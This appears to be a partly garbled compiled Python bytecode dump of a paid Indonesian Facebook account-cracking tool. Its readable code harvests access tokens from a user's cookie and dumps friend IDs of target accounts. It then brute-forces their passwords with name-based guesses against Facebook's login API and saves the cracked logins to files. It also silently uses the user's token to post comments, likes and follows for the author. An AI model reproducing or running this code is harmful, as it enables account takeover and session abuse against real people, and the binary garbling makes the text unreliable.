o
    �՗b�� �                   @   s   d dl Z ee �d�� dS )�    NsÔ  �                   @   s�  d Z dZdZdZdee� ZddlZddlZddlZddl	Z	ddl
Z
ddlZddlZddlZddlZddlZddl
mZ ddlmZ dd	lmZ ddlmZ dd
lmZ dd
lmZ dd
lmZ ddlmZ ddlmZ ddlmZ dZdZdZdZ dZ!dZ"dZ#dZ$dZ%dZ&zddlZW n e'y�   e(e!� d�� e(e$� de� d�� e	�)d� Y nw zddlZW n e'y�   e(e!� d�� e(e$� de� d�� e	�)d� Y nw zddlZ*W n e'y�   e(e!� d�� e(e$� de� d�� e	�)d� Y nw d Z+e
�,e%e!e e%g�Z!d!d"� Z-e-�  d#d$� Z.e�/� Z0e0j1Z2e0j3Z4e0j5Z6d%d&d'd(d)d*d+d,d-d.d/d0d1�Z7g d2�Z8ze4dk �s9e4d3k�r<e9�  e4d4 Z:W n e;�yN   e9�  Y nw e8e: Z<d5e6e<e2f Z=g Z>g a?g a@daAd6d7� ZBd8d9� ZCd:ZDd;ZEd<ZFd=ZGd>ZHd?ZId@dAiZJdBdC� ZKdDdE� ZLdFdG� ZMdHdI� ZNG dJdK� dK�ZOdLdM� ZPdNdO� ZQe
�,dPg�ZRe
�,g dQ��ZSe
�,dRdSg�ZTe
�,dTg�ZUdUdV� ZVdWdX� ZWdYdZ� ZXd[d\� ZYd]d^� ZZd_d`� Z[dadb� Z\dcdd� Z]dedf� Z^dgdh� ZIdidj� Z_dkdl� Z`dmdn� Zadodp� Zbecdqk�r�e	�)dr� eK�  eW�  dS dS )sZA7M4Dz0.5l   �#7l l   �Rb7% z

https://www.facebook.com/�    N)�randint)�ThreadPoolExecutor)�ConnectionError)�BeautifulSoup)�date)�datetime)�quotez[0;90mz[38;5;196mz
[38;5;46mz[38;5;226mz
[38;5;44mz[1;95mz[1;96mz[38;5;231mz[38;5;208mz[38;5;248mz | z[*]z Module requests not installedzpip install requestsz$ The bs4 module is not installed yetzpip install bs4z$ Futures module is not installed yetzpip install futures�https://mbasic.facebook.comc                  C   sv   t t�� �t t�� � } d�| �}td| � t�d�j}||v r-td� t t�� �}d S td� td� t	�
�  d S )N�-z[37;1mYOUR ID:[1;90m zAhttps://raw.githubusercontent.com/A7M4D-1T/NEW-TOOLS/main/.Serverz[92m YOUR ID IS ACTIVE .....z[91m YOUR ID IS NOT ACTIVE  zH[90m BUY ( 1 MOON 15$ ) ( 1 Weekly 5$ ) MY TELEGRAM == >> @KALILINUX404)�str�os�geteuid�getlogin�join�print�requests�get�text�sys�exit)�uuid�idZLINUX�msg� r   � �chk4   s   
r   c                   C   s   t d� d S )Nu  [1;90m
   ⠄⠄⠄⠄⠄⠄⣀⣀⣤⣤⣴⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣦⣤⣤⣄⣀⡀⠄⠄⠄⠄⠄
   ⠄⠄⠄⠄⣴⣿⣿⡿⣿⢿⣟⣿⣻⣟⡿⣟⣿⣟⡿⣟⣿⣻⣟⣿⣻⢿⣻⡿⣿⢿⣷⣆⠄⠄⠄
   ⠄⠄⠄⢘⣿⢯⣷⡿⡿⡿⢿⢿⣷⣯⡿⣽⣞⣷⣻⢯⣷⣻⣾⡿⡿⢿⢿⢿⢯⣟⣞⡮⡀⠄⠄
   ⠄⠄⠄⢸⢞⠟⠃⣉⢉⠉⠉⠓⠫⢿⣿⣷⢷⣻⣞⣿⣾⡟⠽⠚⠊⠉⠉⠉⠙⠻⣞⢵⠂⠄⠄
   ⠄⠄⠄⢜⢯⣺⢿⣻⣿⣿⣷⣔⡄⠄⠈⠛⣿⣿⡾⠋⠁⠄⠄⣄⣶⣾⣿⡿⣿⡳⡌⡗⡅⠄⠄
   ⠄⠄⠄⢽⢱⢳⢹⡪⡞⠮⠯⢯⡻⡬⡐⢨⢿⣿⣿⢀⠐⡥⣻⡻⠯⡳⢳⢹⢜⢜⢜⢎⠆⠄⠄
   ⠄⠄⠠⣻⢌⠘⠌⡂⠈⠁⠉⠁⠘⠑⢧⣕⣿⣿⣿⢤⡪⠚⠂⠈⠁⠁⠁⠂⡑⠡⡈⢮⠅⠄⠄
   ⠄⠄⠠⣳⣿⣿⣽⣭⣶⣶⣶⣶⣶⣺⣟⣾⣻⣿⣯⢯⢿⣳⣶⣶⣶⣖⣶⣮⣭⣷⣽⣗⠍⠄⠄
   ⠄⠄⢀⢻⡿⡿⣟⣿⣻⣽⣟⣿⢯⣟⣞⡷⣿⣿⣯⢿⢽⢯⣿⣻⣟⣿⣻⣟⣿⣻⢿⣿⢀⠄⠄
   ⠄⠄⠄⡑⡏⠯⡯⡳⡯⣗⢯⢟⡽⣗⣯⣟⣿⣿⣾⣫⢿⣽⠾⡽⣺⢳⡫⡞⡗⡝⢕⠕⠄⠄⠄
   ⠄⠄⠄⢂⡎⠅⡃⢇⠇⠇⣃⣧⡺⡻⡳⡫⣿⡿⣟⠞⠽⠯⢧⣅⣃⠣⠱⡑⡑⠨⢐⢌⠂⠄⠄
   ⠄⠄⠄⠐⠼⣦⢀⠄⣶⣿⢿⣿⣧⣄⡌⠂⠢⠩⠂⠑⣁⣅⣾⢿⣟⣷⠦⠄⠄⡤⡇⡪⠄⠄⠄
   ⠄⠄⠄⠄⠨⢻⣧⡅⡈⠛⠿⠿⠿⠛⠁⠄⢀⡀⠄⠄⠘⠻⠿⠿⠯⠓⠁⢠⣱⡿⢑⠄⠄⠄⠄
   ⠄⠄⠄⠄⠈⢌⢿⣷⡐⠤⣀⣀⣂⣀⢀⢀⡓⠝⡂⡀⢀⢀⢀⣀⣀⠤⢊⣼⡟⡡⡁⠄⠄⠄⠄
   ⠄⠄⠄⠄⠄⠈⢢⠚⣿⣄⠈⠉⠛⠛⠟⠿⠿⠟⠿⠻⠻⠛⠛⠉⠄⣠⠾⢑⠰⠈⠄⠄⠄⠄⠄
   ⠄⠄⠄⠄⠄⠄⠄⠑⢌⠿⣦⡡⣱⣸⣸⣆⠄⠄⠄⣰⣕⢔⢔⠡⣼⠞⡡⠁⠁⠄⠄⠄⠄⠄⠄
   ⠄⠄⠄⠄⠄⠄⠄⠄⠄⠑⢝⢷⣕⡷⣿⡿⠄⠄⠠⣿⣯⣯⡳⡽⡋⠌⠄⠄⠄⠄⠄⠄⠄⠄⠄
   ⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠙⢮⣿⣽⣯⠄⠄⢨⣿⣿⡷⡫⠃⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄
   ⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠘⠙⠝⠂⠄⢘⠋⠃⠁⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄)r   r   r   r   r   �bannerD   s   r   �Januari�FebruariZMa7ret�April�Mei�Juni�Juli�Agustus�	September�Oktober�November�Desember)�01�02�03Z04Z05Z06Z07Z08Z09Z10Z11�12�r   r   ZMaretr   r    r!   r"   r#   r$   r%   r&   r'   �   �   z%s-%s-%sc                   C   sv   dt j�� v rzt�d� W d S    Y d S dt j�� v r,zt�d� W d S    Y d S zt�d� W d S    Y d S )NZlinux�clear�win�cls)r   �platform�lowerr   �systemr   r   r   r   �resikq   s   r5   c                 C   s2   | d D ]}t j�|� t j��  t�d� qd S )N�
g���Q��?)r   �stdout�write�flush�time�sleep)�z�er   r   r   �jalan}   s
   
�r>   zhttps://business.facebook.comz�Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36zILu Ganteng Banget Bang. Gw Mau Recode SClu, Soalnya Gw Goblok Soal Coding�https://www.facebook.com/zhttps://m.facebook.com/�https://mbasic.facebook.com/�
user-agentz�Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]c                   C   s~   zt �d� W n   Y zt �d� W n   Y zt �d� W n   Y zt �d� W n   Y zt �d� W d S    Y d S )N�loginZCPZOK�login/cookie.json�login/token.json)r   �mkdir�remover   r   r   r   �mkdir_data_login�   s   rG   c           	   
   C   s�   z_t �� �P}|jd| d�}t|jd�}|�dddi�D ]0}dt|�v rKt�dt|j	���
d	�t�d
t|j	���
d	�dd�}d|d  }|j||| d�}qW d   � W d S 1 sXw   Y  W d S  tyr } zW Y d }~d S d }~ww )Nz%https://mbasic.facebook.com/language/��cookies�html.parser�form�method�postzBahasa Indonesiazname="fb_dtsg" value="(.*?)"r.   zname="jazoest" value="(.*?)")�fb_dtsg�jazoest�submitr	   �action)�datarI   )r   �Sessionr   �par�content�find_allr   �re�searchr   �grouprM   �	Exception)	�cookie�xyz�reqZpra�xZbahasa�url�execr=   r   r   r   �language�   s$   
���&�� ra   c              
   C   s�   zDdt dd��� i}d|  }t�� �(}t|j||d�jd�}|jddd	�}t|d
 ��	d�d }|W  d   � W S 1 s=w   Y  W d S  t
yX } z| W  Y d }~S d }~ww )Nr[   rC   �rr@   rH   rJ   �aZLainnya��string�href�=r.   )�open�readr   rS   rT   r   rU   �findr   �splitrZ   )Zusernamer[   r_   r\   r]   Zkutr   r=   r   r   r   �
convert_id�   s   
(�� rl   c                 C   s   t t� d�� t�  d S )NzID NOT PUBLIC PASET NEW ID)r   �Pr   )�errorr   r   r   �kecuali�   s   
ro   c                   @   s4   e Zd Zdd� Zdd� Zdd� Zdd� Zd	d
� ZdS )�
bot_authorc                 C   s\   d| _ || _tt�g}g d�| _|D ]}| �||� | �d|� d�|� | �|||� qd S )Nr   )zMantap BangzSemangat Teruszvega casperzbg syafik gantengr@   z?v=timeline)�loop�cookie_mentahr   �Syafii�komen�	get_folls�
get_likers�	get_posts)�selfr[   �tokenrr   Zlist_idr^   r   r   r   �__init__�   s    <zbot_author.__init__c                 C   s�   t �� �L}z(t|jd| |d�jd�jddd�D ]}d|d v r+|jd	|d  |d�}qW n ty? } zW Y d }~nd }~ww W d   � d S W d   � d S 1 sSw   Y  d S )
Nzhttps://mbasic.facebook.com/%srH   rJ   rc   T�rf   zsubscribe.phprf   �https://mbasic.facebook.com%s)r   rS   rT   r   rU   rV   rZ   )rx   r   r[   r\   r^   Z
exec_follsr=   r   r   r   ru   �   s   
("��� ��"�zbot_author.get_follsc           
      C   s  t �� �|}zXt|j||d�jd�}|jddd�D ]4}d|jv rLt�g d��}t|jd|d	  |d�jd��d�D ]}||jkrK|jd
|d	  |d�}q8q8q| �	d
|j
ddd�d	  |� W n tyo }	 zW Y d }	~	nd }	~	ww W d   � d S W d   � d S 1 s�w   Y  d S )NrH   rJ   rc   Tr{   ZTanggapi)ZSuperZWowZPedulir|   rf   r	   zLihat Berita Lainrd   )r   rS   rT   r   rU   rV   r   �random�choicerv   rj   rZ   )
rx   r_   r[   r\   Zbosr^   Z_react_type_r<   Zreq2r=   r   r   r   rv   �   s$   

("�"� ��
"�zbot_author.get_likersc           	      C   s  t �� �u}zQ|jd||f |d��� d D ]?}dt�| j�d|d  | �� f }t�|j	d|d ||f |d�j
�}d|v rTtd	d
��| j� tdd
��|� tt� � qW n tyh } zW Y d }~nd }~ww W d   � d S W d   � d S 1 s|w   Y  d S )Nz3https://graph.facebook.com/%s/posts?access_token=%srH   rR   z%s

%s%sr?   r   zAhttps://graph.facebook.com/%s/comments?message=%s&access_token=%srn   rC   �wrD   )r   rS   r   �jsonr}   r~   rt   �waktu�loadsrM   r   rh   r8   rr   r   �"___fii___Sayang___Kamu___Widiya___rZ   )	rx   r   r[   ry   r\   r^   Zkomenor   r=   r   r   r   rw   �   s   
""$4��� ��"�zbot_author.get_postsc                 C   sv   g d�t �� jd  }ddddddd	d
�tt �� �d�� }dt �� j|t �� jf }t �� �d�}d|||f }|S )Nr,   r.   ZMingguZSeninZSelasaZRabuZKamisZJumatZSabtu)ZSundayZMondayZTuesdayZ	WednesdayZThursdayZFridayZSaturdayz%Az%s %s %sz%XzL

Komentar Ditulis Oleh Seorang Penjomblo Handal
[ Pukul %s WIB ]
- %s, %s -)r   �now�monthr   �strftime�day�year)rx   �_bulan_Z_hari_Zhari_iniZjamZtemr   r   r   r�   �   s   &zbot_author.waktuN)�__name__�
__module__�__qualname__rz   ru   rv   rw   r�   r   r   r   r   rp   �   s    rp   c                 C   sl   t �� �(}|jtd ttdtdddddd�	d	| id
�}t�d|j��	d�W  d   � S 1 s/w   Y  d S )Nz/business_locationszbusiness.facebook.com�1�#id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7�	max-age=0�Utext/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8ztext/html; charset=utf-8)	rA   �referer�host�origin�upgrade-insecure-requests�accept-language�cache-control�accept�content-typer[   )�headersrI   z	(EAAG\w+)r.   )
r   rS   r   �url_businness�ua_business�web_fbrW   rX   r   rY   )r[   r\   Zget_tokr   r   r   �clotox�   s    

�	�
$�r�   c               
   C   s�   t �d� t�  t�  td� tt� d�� td� ttt� dt� ���} z$t	| �}d| i}t
||| � tdd��|� tdd��| � t�  W d S  tjjy_   tt� d	�� t�  Y d S  tttfyu   tt� d
�� t�  Y d S w )Nr/   � z Don't use personal accountz LOGIN COOKIE : r[   rD   r   rC   u!   [•] Tidak Ada Koneksi Internet u   [•] Cookies Invalid )r   r4   r   rG   r   rm   r   �input�Br�   rp   rh   r8   �menur   �
exceptionsr   r   �KeyError�IOError�AttributeError)r[   ry   Zcokir   r   r   �
log_cookie�   s    
*.r�   zBANG MANISS KALII)zANJAY SLEMEX LORD NIKI GANTENG zNIKI zBANH KOK LO JAGO BANGET SIH zLORD DAH MAKAN BLMz!LU GANTENG BANH TAPI SAYANG Jomloz'AHAHAHAHHA BANYAK KANG RECOD AWAS BANG zRUPAT  XXXX :)c               
   C   sf  z�t dd��� } dt dd��� i}t}t}t}d}tjd| d | d |  |d	� tjd
| d |  |d	� tjd
| d |  |d	� tjd
| d |  |d	� tjd
|  d |  |d	� tjd
|  d |  |d	� tjd
t d |  |d	� tjd|  |d	� tjd|  |d	� tjd|  |d	� tt	� d�� t
�  W d S  ty� } zW Y d }~d S d }~ww )NrD   rb   r[   rC   Z254018450221419zhttps://graph.facebook.com/z/comments/?message=z&access_token=rH   z=https://graph.facebook.com/403388338365169/comments/?message=zKhttps://graph.facebook.com/403388338365169/likes?summary=true&access_token=z SUCCESSFULLY LIGIN)rh   ri   �
komenredem�komtwol�kartu2dr   rM   �konr   rm   r�   rZ   )ry   r[   Zkom�komentarZpipprM   r=   r   r   r   r�     s,   "� r�   c               	   C   sp  z:t dd��� adt dd��� iat�� jdt td�} t�d��� }tt� t�	| j
�}|d }|d	 }|d
 }W n ttfyV   td� tt� dt� d�� t�  Y nw t�d� t�  td� tt� dt� |� �� tt� dt� |� �� tt� dt� |� �� tt� dt� |d � �� tt� dt� |d � �� tt� dt� |d � �� tt� dt� |d � �� tt� dt� |d � �� td� tt� d�� td� tt� d�� tt� d�� tt� d�� td� tt� d t� ��}|d!v r�t�  d S |d"v �r	t�  d S |d#v �r,tt� d$t� d%t� d&�� zt�d'� W n   Y t�  d S tt� d(�� t�  d S ))NrD   rb   r[   rC   z-https://graph.facebook.com/me?access_token=%srH   zhttp://ipinfo.io/json�namer   �linkr�   z[!]z cookie failed.r/   u   [•] Account name      : u   [•] User ID        : u   [•] Facebook Url   : u   [•] IP address : Zipu   [•] Region         : Zregionu   [•] Quota info     : Zorgu   [•] Time zone      : �timezoneu   [•] City           : ZcityZ+___________________________________________z-[1] NEW DUMP FROM ID PUBLIC  (FACEBOOK) 10 IDz,[2] NEW DUMP FROM ID PUBLIC (FACEBOOK) 1 ID z[0] Log Out u   [•] Select which one : �r�   r(   ��2r)   )�0Z00u   [•][zEnter To Logout�]rB   u   [•] Correct Content )rh   ri   ry   r[   r   rS   r   r�   ra   r�   r   r�   r�   r   r>   rm   �Mr�   r   r4   r   r�   r�   �massal�publikZshutilZrmtreer   r�   )r   �gtZloloZlololZlolol_idr�   Zppr   r   r   r�   $  sT   �




r�   c            
   	   C   s�  zt dd��� } dt dd��� i}W n ty,   td� tt� dt� d�� t�  Y nw ztd� tt� d�� td� ttt� d	t	� ���}W n   d
}Y t
|�D ]a}|d
7 }td� tt� dt� |� dt	� ��}z/t�� jd|| f |d�}t�|j�}|d d D ]}|d }|d }	t�|d |	 � q�W qT ty�   td� tt� dt� d�� t�  Y qTw tt�dkr�td� tt� dt� dt	� tt�� �� t�  d S td� tt� dt	� tt�� �� t�  d S )NrD   rb   r[   rC   r�   �   [•]� Modar Dinggo Cookies u-   [•] YOUR CHOESS ID DUMP ID MAX 10 ID PUBLICu   [•] CHOES ID : r.   u   [•] TARGET ID FACEBOOK z : �Ihttps://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%srH   �friendsrR   r   r�   �<=>z User id not foundr   z Sorry, your total id is �   [•] Total id : )rh   ri   r�   r   rm   r�   r   �intr�   r�   �ranger   rS   r   r�   r�   r   r   �appendr�   r�   �len�fii_xd)
ry   r[   Ztanya_total�t�_id_r_   r<   �i�uid�namar   r   r   r�   P  sF   ���*
r�   c                  C   s\  zt dd��� } dt dd��� i}W n ty(   tt� dt� d�� t�  Y nw td� tt� dt� ��}z/t	�
� jd	|| f |d
�}t�|j�}|d d D ]}|d }|d }t�|d | � qPW n ty   td� tt� dt� d�� t�  Y nw tt�dkr�td� tt� dt� tt�� �� t�  d S tt� dt� tt�� �� t�  d S )NrD   rb   r[   rC   r�   r�   r�   u   [•] Enter user id : r�   rH   r�   rR   r   r�   r�   z- User id not found or the account is private r   r�   )rh   ri   r�   r   rm   r�   r   r�   r�   r   rS   r   r�   r�   r   r   r�   r�   r�   r�   r�   )ry   r[   r�   r_   r<   r�   r�   r�   r   r   r   r�   s  s2   ���
$r�   c                  C   s  t �  td� tt� dt� ��} | dv r'td� tt� dt� d�� t�  d S | dv �rtt� dt� d�� tt� dt� d	�� td� tt� dt� ��}|d
v �rѐzcd}d}||v �r�tt� dt� d�� td� tt� dt� ��}|dv r�tdd��S}td� tt� dt� d�� td� tt� dt� ���	d�}t
|�dkr�td� tt� dt� d�� t�  t�  tD ]}|�	d�\}}	|�t||� q�W d   � n1 s�w   Y  t�  �n�|dv �r�tdd����}t�  tD �]�}|�	d�\}}	|	�	d�}
t
|
�dk�r|	|
d |
d d |
d d |
d d |
d d |
d d |
d d  |
d d! |
d d" |
d d# |
d d$ |
d d% |
d d& |
d d' |
d d( |
d d) |
d d* |
d d+ |
d d, |
d d- |
d d. |
d d/ |
d d0 |
d d1 g}�nt
|
�d2k�r |	|
d |
d d |
d d |
d d |
d d |
d d |
d d  |
d d! |
d d" |
d d# |
d d$ |
d d% |
d d& |
d d' |
d d( |
d d) |
d d* |
d d+ |
d d, |
d d- |
d d. |
d d/ |
d d0 |
d d1 g}n�t
|
�d3k�r�|	|
d |
d d |
d d |
d d |
d d |
d d |
d d  |
d d! |
d d" |
d d# |
d d$ |
d d% |
d d& |
d d' |
d d( |
d d) |
d d* |
d d+ |
d d, |
d d- |
d d. |
d d/ |
d d0 |
d d1 g}ng d4�}|�t||� q�W d   � n	1 �s�w   Y  t�  ntt� dt� d5�� t�  W d S W d S W d S  ttf�y�   tt� dt� d5�� t�  Y d S w tt� dt� d�� td� tt� dt� ��}|dv �rNtdd��N}td� tt� dt� d�� td� tt� dt� ���	d�}t
|�dk�r"tt� dt� d�� t�  tD ]}|�	d�\}}	|�t||� �q'W d   � n	1 �sDw   Y  t�  d S |dv �rtdd����}t�  tD �]�}|�	d�\}}	|	�	d�}
t
|
�dk�r�|	|
d |
d d |
d d |
d d |
d d |
d d |
d d  |
d d! |
d d" |
d d# |
d d$ |
d d% |
d d& |
d d' |
d d( |
d d) |
d d* |
d d+ |
d d, |
d d- |
d d. |
d d/ |
d d0 |
d d1 g}�nt
|
�d2k�rq|	|
d |
d d |
d d |
d d |
d d |
d d |
d d  |
d d! |
d d" |
d d# |
d d$ |
d d% |
d d& |
d d' |
d d( |
d d) |
d d* |
d d+ |
d d, |
d d- |
d d. |
d d/ |
d d0 |
d d1 g}n�t
|
�d3k�r�|	|
d |
d d |
d d |
d d |
d d |
d d |
d d  |
d d! |
d d" |
d d# |
d d$ |
d d% |
d d& |
d d' |
d d( |
d d) |
d d* |
d d+ |
d d, |
d d- |
d d. |
d d/ |
d d0 |
d d1 g}ng d4�}|�t||� �q_W d   � n	1 �s
w   Y  t�  d S d S | d6v �
rtd� tt� d7t� d8�� tt� dt� d	�� tt� dt� ��}|d
v �r��zdd9}d9}||v �r�td� tt� dt� d�� tt� dt� ��}|dv �r�tdd��V}td� tt� dt� d�� td� tt� dt� d���	d�}t
|�dk�r�td� tt� dt� d�� t�  t�  tD ]}|�	d�\}}	|�t||� �q�W d   � n	1 �s�w   Y  t�  �n�|dv �r�tdd����}t�  tD �]�}|�	d�\}}	|	�	d�}
t
|
�dk�rs|	|
d |
d d |
d d |
d d |
d d |
d d |
d d  |
d d! |
d d" |
d d# |
d d$ |
d d% |
d d& |
d d' |
d d( |
d d) |
d d* |
d d+ |
d d, |
d d- |
d d. |
d d/ |
d d0 |
d d1 g}�nt
|
�d2k�r�|	|
d |
d d |
d d |
d d |
d d |
d d |
d d  |
d d! |
d d" |
d d# |
d d$ |
d d% |
d d& |
d d' |
d d( |
d d) |
d d* |
d d+ |
d d, |
d d- |
d d. |
d d/ |
d d0 |
d d1 g}n�t
|
�d3k�ru|	|
d |
d d |
d d |
d d |
d d |
d d |
d d  |
d d! |
d d" |
d d# |
d d$ |
d d% |
d d& |
d d' |
d d( |
d d) |
d d* |
d d+ |
d d, |
d d- |
d d. |
d d/ |
d d0 |
d d1 g}ng d4�}|�t||� �q�W d   � n	1 �s�w   Y  t�  nt|� � t�  W d S W d S W d S  ttf�y�   t|� � t�  Y d S w td� tt� d:t� d�� td� tt� dt� ��}|dv �rDtdd��U}td� tt� d;t� d<�� td� tt� dt� ���	d�}t
|�dk�rtd� tt� dt� d�� t�  t�  tD ]}|�	d�\}}	|�t||� �qW d   � n	1 �s:w   Y  t�  d S |dv �
r
tdd����}t�  tD �]�}|�	d�\}}	|	�	d�}
t
|
�dk�r�|	|
d |
d d |
d d |
d d |
d d |
d d |
d d  |
d d! |
d d" |
d d# |
d d$ |
d d% |
d d& |
d d' |
d d( |
d d) |
d d* |
d d+ |
d d, |
d d- |
d d. |
d d/ |
d d0 |
d d1 g}�nt
|
�d2k�	rg|	|
d |
d d |
d d |
d d |
d d |
d d |
d d  |
d d! |
d d" |
d d# |
d d$ |
d d% |
d d& |
d d' |
d d( |
d d) |
d d* |
d d+ |
d d, |
d d- |
d d. |
d d/ |
d d0 |
d d1 g}n�t
|
�d3k�	r�|	|
d |
d d |
d d |
d d |
d d |
d d |
d d  |
d d! |
d d" |
d d# |
d d$ |
d d% |
d d& |
d d' |
d d( |
d d) |
d d* |
d d+ |
d d, |
d d- |
d d. |
d d/ |
d d0 |
d d1 g}ng d4�}|�t||� �qUW d   � n	1 �
s w   Y  t�  d S d S | d=v �rtd� tt� d7t� d8�� tt� dt� d	�� td� tt� dt� ��}|d
v �r��zhd9}d9}||v �r�td� tt� dt� d�� td� tt� dt� ��}|dv �
r�tdd��V}td� tt� d>t� d?�� td� tt� dt� d���	d�}t
|�dk�
r�td@� tt� dt� dA�� t�  t�  tD ]}|�	d�\}}	|�t||� �
q�W d   � n	1 �
s�w   Y  t�  �n�|dv �r�tdd����}t�  tD �]�}|�	d�\}}	|	�	d�}
t
|
�dk�rq|	|
d |
d d |
d d |
d d |
d d |
d d |
d d  |
d d! |
d d" |
d d# |
d d$ |
d d% |
d d& |
d d' |
d d( |
d d) |
d d* |
d d+ |
d d, |
d d- |
d d. |
d d/ |
d d0 |
d d1 g}�nt
|
�d2k�r�|	|
d |
d d |
d d |
d d |
d d |
d d |
d d  |
d d! |
d d" |
d d# |
d d$ |
d d% |
d d& |
d d' |
d d( |
d d) |
d d* |
d d+ |
d d, |
d d- |
d d. |
d d/ |
d d0 |
d d1 g}n�t
|
�d3k�rs|	|
d |
d d |
d d |
d d |
d d |
d d |
d d  |
d d! |
d d" |
d d# |
d d$ |
d d% |
d d& |
d d' |
d d( |
d d) |
d d* |
d d+ |
d d, |
d d- |
d d. |
d d/ |
d d0 |
d d1 g}ng d4�}|�t||� �
q�W d   � n	1 �s�w   Y  t�  nt|� � t�  W d S W d S W d S  ttf�y�   t|� � t�  Y d S w td� tt� dt� d�� tt� dt� ��}|dv �r>tdd��U}td� tt� d;t� d?�� td� tt� dt� ���	d�}t
|�dk�rtd� tt� dt� dA�� t�  t�  tD ]}|�	d�\}}	|�t||� �qW d   � n	1 �s4w   Y  t�  d S |dv �rtdd����}t�  tD �]�}|�	d�\}}	|	�	d�}
t
|
�dk�r�|	|
d |
d d |
d d |
d d |
d d |
d d |
d d  |
d d! |
d d" |
d d# |
d d$ |
d d% |
d d& |
d d' |
d d( |
d d) |
d d* |
d d+ |
d d, |
d d- |
d d. |
d d/ |
d d0 |
d d1 g}�nt
|
�d2k�ra|	|
d |
d d |
d d |
d d |
d d |
d d |
d d  |
d d! |
d d" |
d d# |
d d$ |
d d% |
d d& |
d d' |
d d( |
d d) |
d d* |
d d+ |
d d, |
d d- |
d d. |
d d/ |
d d0 |
d d1 g}n�t
|
�d3k�r�|	|
d |
d d |
d d |
d d |
d d |
d d |
d d  |
d d! |
d d" |
d d# |
d d$ |
d d% |
d d& |
d d' |
d d( |
d d) |
d d* |
d d+ |
d d, |
d d- |
d d. |
d d/ |
d d0 |
d d1 g}ng d4�}|�t||� �qOW d   � n	1 �s�w   Y  t�  d S d S d S )BNr�   u   [•] Choose : )r   r�   z Option cannot be emptyr�   u.   [•] Display the check point account options zY/tz> Sometimes if it displays the option to rarely get an account )�y�YZanjinku*   [•] Crack using manual/default password zM/D)�mr�   �   )Zmax_workersu   [•] Password example : zbaby, dog, dicku   [•] Create password : �,r   z Password cannot be emptyr�   )�d�D�   r   Z123Z1234Z12345Z123456r+   Z1212Z321Z123321Z123123Z112233Z1122Z1995Z2022Z2005Z1999Z2000Z2001Z2002Z2003Z2004r�   Z2006Z	123456789�   �   )Z654321Z
1234512345Z
1122334455Z
1234554321z Erorr)�3r*   u   [•] Show checkpoint options zY/TZAnjinku+   [•] Crack using manual/defaults password u   [•] Example password zAnjink,cock,darlingr�   u   [•] Example password : zlove,dog,cockz  z Password can't be empty)�koner   r�   rm   r�   r�   r   r>   r   rk   r�   �startedr   rP   �apir�   r�   �apiiii�mbasic�mobil�mbasicc�mobill)ZfiisayangwidiyaZ_checkoptions_Z_key�keyZterZcoegZasu�userr�   r�   Zfrist�fiir   r   r   r�   �  s  


��



������&�4
��



�����
�



��



�������*
��



�����
�



��



�������*
��



�����
�Br�   c                   C   sH   t d� t t� dt� d�� t t� dt� d�� t t� dt� d�� d S )Nr�   z[1] B-API >>>> ZFastz[2] Mbasic >>>> ZLowz[3] Mobile >>>> zVery low)r   rm   r�   r   r   r   r   r�   �  s   r�   c                   C   s�   t d� t t� dt� dt� dt� dt� dt� �� t t� dt� dt� dt� dt� dt� �� t d� t t� d	�� t t� d
t� �� d S )Nr�   r�   z	 Results zok z	saved in zok/zcp zcp/u*   [•] Airplane mode 5 seconds if no resultz   )r   rm   r�   �I�tanggal�Kr   r   r   r   r�   �  s   **r�   c                 C   s�  z	t dd��� }W n ty   d}Y nw tj�dt� dt� dt� dt	t
�� dt� dt� t	t�� dt� d	t� t	t�� �� tj��  |D �]}|�� }tt�d
d��tt�dd��tt�dd��dd|ddd�}t�� }|jdt| � d t|� d |d�}d|jv r�d|jv r�tdt� dt� | � d|� �� t�d| |f � t dt d��d| |f �  n�d|�� d  v �r^z`t d!d��� ad"t d#d��� ia|jd$| tf td%��� d& }|�d�\}}	}
t| }tdt� dt� | � d|� d|	� d|� d|
� �� t�d| |f � t d't d��d(| ||	||
f � W  nD t tf�y,   d}	d}d}
Y n   Y t!| ||� tdt� dt� | � d|� �� t�d| |f � t d't d��d| |f �  nqDtd)7 ad S �*N�uarb   ��Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109��   [•] CHECK r�   �/�OK : �CP : g    �sAg    8�|Ai N  i@�  Z	EXCELLENTz!cell.CTRadioAccessTechnologyHSDPA�!application/x-www-form-urlencodedZLiger)zx-fb-connection-bandwidthzx-fb-sim-hnizx-fb-net-hnizx-fb-connection-qualityzx-fb-connection-typerA   r�   zx-fb-http-enginez?https://b-api.facebook.com/method/auth.login?format=json&email=z
&password=a�  &credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_inlololid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true�r�   Zsession_keyZEAAA� |----> �   •�%s|%s�
OK/%s.jsonrc   �%s|%s
zwww.facebook.comZ	error_msgrD   r[   rC   �-https://graph.facebook.com/%s?access_token=%srH   �birthday�
CP/%s.json�%s|%s|%s %s %s
